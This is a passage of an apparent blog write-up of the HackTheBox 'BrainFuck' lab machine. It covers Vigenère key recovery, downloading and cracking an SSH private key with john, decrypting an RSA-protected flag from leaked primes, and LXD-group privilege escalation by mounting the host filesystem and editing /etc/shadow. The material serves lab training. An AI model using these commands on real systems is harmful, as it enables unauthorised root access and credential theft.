+</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220818034735.png" alt="" data-proofer-ignore></p><li><strong>Example</strong> of deriving the <code class="language-plaintext highlighter-rouge">Key</code> from <code class="language-plaintext highlighter-rouge">Plaintext</code> &amp; <code class="language-plaintext highlighter-rouge">Ciphertext</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre> Plaintext: THIS IS SECRET
+ Key: 	   XVHE UW NOPGDZ
+ Ciphertext: QCPW CO FSRXHS
+
+ Key = Ciphertext - Plaintext
+ Key = Q(16) - T(19)
+</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220818035327.png" alt="" data-proofer-ignore></p><li>Derive key<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre> Ciphertext: Pieagnm - Jkoijeg nbw zwx mle grwsn
+ Plaintext:  Orestis - Hacking for fun and profit
+	
+	
+ Key = P - O(14)  #B
+ Key = i - r(17)  #R
+ Key = e - e(4)   #A
+ Key = a - s(18)  #I
+ Key = g - t(19)  #N
+ Key = n - i(8)   #F
+ Key = m - s(18)  #U 
+ Key = J - H(7)   #C
+ Key = k - a(0)   #K
+ Key = o - c(2)   #M
+ Key = i - k(10)  #Y
+ Key = j - i(8)   #B
+	
+ Key = FUCKMYBRAIN
+</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220818060216.png" alt="" data-proofer-ignore></p><li>Decrypt URL<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre> https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
+</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220818060905.png" alt="" data-proofer-ignore></p></ol><h2 id="derive-encryption-key-w-vigenere-cipher-vigenere-table">Derive encryption key w/ Vigenere Cipher (Vigenere Table) <a href="#derive-encryption-key-w-vigenere-cipher-vigenere-table" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>Vigenere Table<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre>  Plaintext:  Orestis - Hacking for fun and profit
+  Ciphertext: Wejmvse - Fbtkqal zqb rso rnl cwihsf
+	
+  O Mapped to W = I
+  r Mapped to e = N
+  e mapped to j = F
+  s mapped to m = U
+  t mapped to v = C
+  i mapped to s = K
+  s mapped to e = M
+  H mapped to F = Y
+  a mapped to b = B
+  c mapped to t = R
+  k mapped to k = A
+  i mapped to q = I
+  n mapped to a = N
+
+  Key = FUCKMYBRAIN
+
+</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220818052843.png" alt="" data-proofer-ignore> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220818052923.png" alt="" data-proofer-ignore> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220818053003.png" alt="" data-proofer-ignore> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220818053118.png" alt="" data-proofer-ignore> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220818053208.png" alt="" data-proofer-ignore> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220818053329.png" alt="" data-proofer-ignore> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220818053409.png" alt="" data-proofer-ignore> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220818053540.png" alt="" data-proofer-ignore> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220818053645.png" alt="" data-proofer-ignore> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220818053722.png" alt="" data-proofer-ignore></p></ul><h2 id="tcp22-ssh">TCP/22 (SSH) <a href="#tcp22-ssh" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Download the key<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/brainfuck/10.10.10.17/loot]
+ └─# curl https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa --insecure &gt; id_rsa; chmod 600 id_rsa
+   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                  Dload  Upload   Total   Spent    Left  Speed
+ 100  1766  100  1766    0     0  11118      0 --:--:-- --:--:-- --:--:-- 11106
+</pre></table></code></div></div><li>SSH w/ downloaded key<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/brainfuck/10.10.10.17/loot]
+ └─# ssh orestis@$ip -i id_rsa 
+ Enter passphrase for key 'id_rsa': 
+</pre></table></code></div></div><li>Crack SSH pass<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/brainfuck/10.10.10.17/loot]
+ └─# /root/tools/john/run/ssh2john.py id_rsa &gt; id_rsa_john
+ ┌──(root💀kali)-[~/htb/brainfuck/10.10.10.17/loot]
+ └─# john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_john
+ Using default input encoding: UTF-8
+ Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+ Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+ Cost 2 (iteration count) is 1 for all loaded hashes
+ Will run 2 OpenMP threads
+ Press 'q' or Ctrl-C to abort, almost any other key for status
+ 3poulakia!       (id_rsa)     
+ 1g 0:00:00:04 DONE (2022-08-19 02:53) 0.2347g/s 2924Kp/s 2924Kc/s 2924KC/s 3poulakia!..3pornuthin
+ Use the "--show" option to display all of the cracked passwords reliably
+ Session completed. 
+</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">3poulakia!</code></ul><li>SSH &amp; Obtain User Flag <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220819025428.png" alt="" data-proofer-ignore></ol><h1 id="privilege-escalation">Privilege Escalation</h1><h2 id="root---via-crackingreverse-engineering-rsa">Root - Via Cracking/Reverse Engineering RSA <a href="#root---via-crackingreverse-engineering-rsa" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>View files in <code class="language-plaintext highlighter-rouge">orestis</code> home directory<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre> orestis@brainfuck:~$ ls -l
+ total 28
+ -rw-rw-r-- 1 orestis orestis  619 Aug 18 22:48 debug.txt
+ -rw-rw-r-- 1 orestis orestis  580 Apr 29  2017 encrypt.sage
+ -rw-rw-r-- 1 orestis orestis 1041 Aug 18 22:32 encrypt.sage.py
+ drwx------ 3 orestis orestis 4096 Apr 29  2017 mail
+ -rw-rw-r-- 1 orestis orestis  329 Aug 18 22:48 output.txt
+ -rw-rw-r-- 1 orestis orestis    5 Aug 18 22:27 password
+ -r-------- 1 orestis orestis   33 Apr 29  2017 user.txt
+	
+</pre></table></code></div></div><li>View <code class="language-plaintext highlighter-rouge">encrypt.sage</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre><td class="rouge-code"><pre> nbits = 1024
+	
+ password = open("/root/root.txt").read().strip()
+ enc_pass = open("output.txt","w")
+ debug = open("debug.txt","w")
+ m = Integer(int(password.encode('hex'),16))
+	
+ p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
+ q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
+ n = p*q
+ phi = (p-1)*(q-1)
+ e = ZZ.random_element(phi)
+ while gcd(e, phi) != 1:
+     e = ZZ.random_element(phi)
+	
+	
+	
+ c = pow(m, e, n)
+ enc_pass.write('Encrypted Password: '+str(c)+'\n')
+ debug.write(str(p)+'\n')
+ debug.write(str(q)+'\n')
+ debug.write(str(e)+'\n')
+	
+</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220819041906.png" alt="" data-proofer-ignore></p><ul><li><code class="language-plaintext highlighter-rouge">p, q, e</code> - suggests that it is RSA<ul><li>We have the values of <code class="language-plaintext highlighter-rouge">p, q, e</code> in <code class="language-plaintext highlighter-rouge">debug.txt</code></ul><li><code class="language-plaintext highlighter-rouge">ct/ciphertext/enc_pass</code> - ciphertext/output of encoding root.txt`<ul><li>We have the values of it in <code class="language-plaintext highlighter-rouge">output.txt</code></ul></ul><li>RSA key generation works by computing:<ul><li>n = pq<li>φ = (p-1)(q-1)<li>d = (1/e) mod φ<li>So given p, q, you can compute n and φ trivially via multiplication. From e and φ you can compute d, which is the secret key exponent. From there, your public key is [n, e] and your private key is [d, p, q]. Once you know those, you have the keys and can decrypt any messages.<li>For RSA to be secure, <code class="language-plaintext highlighter-rouge">p</code> and <code class="language-plaintext highlighter-rouge">q</code> must be kept secret. With access to <code class="language-plaintext highlighter-rouge">p</code>, <code class="language-plaintext highlighter-rouge">q</code>, and <code class="language-plaintext highlighter-rouge">e</code>, calculating <code class="language-plaintext highlighter-rouge">d</code> (the decryption key) is trivial.<li><a href="https://security.stackexchange.com/a/25632">Source</a></ul><li>Google for a script that will do the above for us<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+</pre><td class="rouge-code"><pre> def egcd(a, b):
+     x,y, u,v = 0,1, 1,0
+     while a != 0:
+         q, r = b//a, b%a
+         m, n = x-u*q, y-v*q
+         b,a, x,y, u,v = a,r, u,v, m,n
+         gcd = b
+     return gcd, x, y
+	
+ def main():
+	
+     p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
+     q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
+     e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
+     ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
+	
+     # compute n
+     n = p * q
+	
+     # Compute phi(n)
+     phi = (p - 1) * (q - 1)
+	
+     # Compute modular inverse of e
+     gcd, a, b = egcd(e, phi)
+     d = a
+	
+     print( "n:  " + str(d) );
+	
+     # Decrypt ciphertext
+     pt = pow(ct, d, n)
+     print( "pt: " + str(pt) )
+	
+ if __name__ == "__main__":
+     main()
+</pre></table></code></div></div><ul><li><a href="https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e">Source</a><li>Obtain values of <code class="language-plaintext highlighter-rouge">p, q, e</code> from <code class="language-plaintext highlighter-rouge">debug.txt</code><li>Obtain values of <code class="language-plaintext highlighter-rouge">ct - ciphertext</code> from <code class="language-plaintext highlighter-rouge">output.txt</code></ul><li>Run decrypt script<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/brainfuck/10.10.10.17/loot]
+ └─# python decrypt.py 
+ n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977
+ pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750
+	
+</pre></table></code></div></div><ul><li>Then convert <code class="language-plaintext highlighter-rouge">pt - plaintxt</code> to <code class="language-plaintext highlighter-rouge">Hex</code> and then to <code class="language-plaintext highlighter-rouge">ASCII</code><ul><li><code class="language-plaintext highlighter-rouge">m = Integer(int(password.encode('hex'),16))</code> - due to this line of code (Line 6)</ul></ul><li>Convert <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220819051338.png" alt="" data-proofer-ignore> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220819051359.png" alt="" data-proofer-ignore><li>Root Flag<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre> 6efc1a5dbb8904751ce6566a305bb8ef
+</pre></table></code></div></div></ol><h2 id="root---via-lxd">Root - Via LXD <a href="#root---via-lxd" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>View groups that <code class="language-plaintext highlighter-rouge">orestis</code> belongs to<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre> orestis@brainfuck:~$ groups
+ orestis adm cdrom dip plugdev lxd lpadmin sambashare
+</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">lxd</code></ul><li><a href="https://yufongg.github.io/posts/LXD-Group/">LXD Group Exploit</a><ul><li>A member of the <code class="language-plaintext highlighter-rouge">lxd</code> group can easily privilege escalate to root because LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket.<li>We are able to use <code class="language-plaintext highlighter-rouge">lxd</code> to mount the entire victim’s filesystem into a container, allowing us to have root access to the entire system.</ul><li><a href="https://github.com/saghul/lxd-alpine-builder">Download</a> and transfer image onto <code class="language-plaintext highlighter-rouge">brainfuck.htb</code><li>Exploit<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre> # import image(.tar file) into lxc
+ lxc image import ./alpine.tar.gz --alias privesc
+
+ # Initialize/start a container from that image
+ lxc init privesc privesc-container -c security.privileged=true
+
+ # Mount entire file system to the mnt of the container
+ lxc config device add privesc-container mydevice disk source=/ path=/mnt/root recursive=true
+
+ # Start the container
+ lxc start privesc-container
+
+ # Execute the container and get an interactive shell
+ lxc exec privesc-container /bin/sh
+</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220819052441.png" alt="" data-proofer-ignore></p><li>To obtain root, replace root hash w/ <code class="language-plaintext highlighter-rouge">orestis</code>’s<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre> vi /mnt/root/etc/shadow
+</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220819060640.png" alt="" data-proofer-ignore></p><li>Switch to root w/ <code class="language-plaintext highlighter-rouge">orestis</code>’s password <code class="language-plaintext highlighter-rouge">kHGuERB29DNiNE</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/BrainFuck/images/Pasted%20image%2020220819060751.png" alt="" data-proofer-ignore></ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/hackthebox-linux/'>HackTheBox - Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux-priv-esc-lxd/" class="post-tag no-text-decoration" >linux-priv-esc/lxd</a> <a href="/tags/cryptography/" class="post-tag no-text-decoration" >cryptography</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox - BrainFuck - Yufong&amp;u=https://yufongg.github.io/posts/BrainFuck/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="" data-toggle="tooltip" data-placement="top" title="" target="_blank" rel="noopener" aria-label=""> <i class="fa-fw "></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Blunder/">HackTheBox - Blunder</a><li><a href="/posts/Attacktive-Directory/">TryHackMe - Attacktive Directory</a><li><a href="/posts/Tommy-Boy-1/">Vulnhub - Tommy Boy 1</a><li><a href="/posts/Tiki-1/">Vulnhub - Tiki 1</a><li><a href="/posts/Breach-1/">Vulnhub - Breach 1</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Frolic/"><div class="card-body"> <em class="timeago small" data-ts="1663689600" > 2022-09-21 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Frolic</h3><div class="text-muted small"><p> Overview This machine begins w/ a thorough web enumeration, discovering several directories that contains necessary information to proceed. Directory /admin contains a login page that is coded w/ ...</p></div></div></a></div><div class="card"> <a href="/posts/Prime-1/"><div class="card-body"> <em class="timeago small" data-ts="1643385600" > 2022-01-29 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Vulnhub - Prime 1</h3><div class="text-muted small"><p> Recon NMAP Complete Scan # Nmap 7.92 scan initiated Sat Jan 22 00:11:42 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Prime1/192.168.1.103/scans/...</p></div></div></a></div><div class="card"> <a href="/posts/Glasglow-Smile-1.1/"><div class="card-body"> <em class="timeago small" data-ts="1643731200" > 2022-02-02 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Vulnhub - Glasglow Smile 1.1</h3><div class="text-muted small"><p> Recon NMAP Complete Scan # Nmap 7.92 scan initiated Tue Jan 25 18:30:16 2022 as: nmap -vv --reason -Pn -T4 -sV -p 80 &quot;--script=banner,(http* or ssl*) and not (brute or broadcast or dos or external ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Lame/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox - Lame</p></a> <a href="/posts/Shocker/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox - Shocker</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://yufongg.github.io/posts/BrainFuck/'; this.page.identifier = '/posts/BrainFuck/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://yufongg-github-io.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/yufongg">yufongg</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa 